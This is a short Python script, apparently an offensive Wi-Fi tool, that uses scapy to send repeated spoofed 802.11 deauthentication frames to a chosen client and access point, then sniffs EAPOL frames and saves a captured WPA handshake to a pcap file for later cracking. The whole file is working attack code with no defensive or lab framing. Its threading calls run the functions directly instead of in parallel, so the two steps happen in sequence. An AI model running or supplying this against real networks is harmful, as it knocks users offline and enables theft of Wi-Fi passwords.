import threading
import time
from scapy import *
from scapy.layers.dot11 import *
from scapy.layers.l2 import EAPOL
import sys

count = sys.argv[1]  #Amount of DeAuth's to send
targetMAC = sys.argv[2]  #Target MAC Address
APMAC = sys.argv[3]  #Access Point MAC Address
iface = sys.argv[4]

#Constructing DeAuth message
deauth = RadioTap()/Dot11(
            type=0, subtype=12, addr1=targetMAC, addr2=APMAC, addr3=APMAC)/Dot11Deauth(
            reason=4)

# Function that send the deauthentication messages
def DeAuthenticate(msg, count, iface):
    print("Sending packets ")
    for i in range(int(count)):
        sendp(msg, iface=iface, verbose=0)


# Getting the WPA Handshake
def getHandshake(iface):
    print("Capturing packets")
    def getWPA(pkt):
        if EAPOL in pkt:
            allpackets.append(pkt)
            print("Packet Saved!")

    allpackets = []
    pkt = sniff(iface=iface, count=0, prn=getWPA)
    wrpcap('sniffed.pcap', allpackets)





threading.Thread(target=DeAuthenticate(deauth, count, iface)).start()
threading.Thread(target=getHandshake(iface)).start()
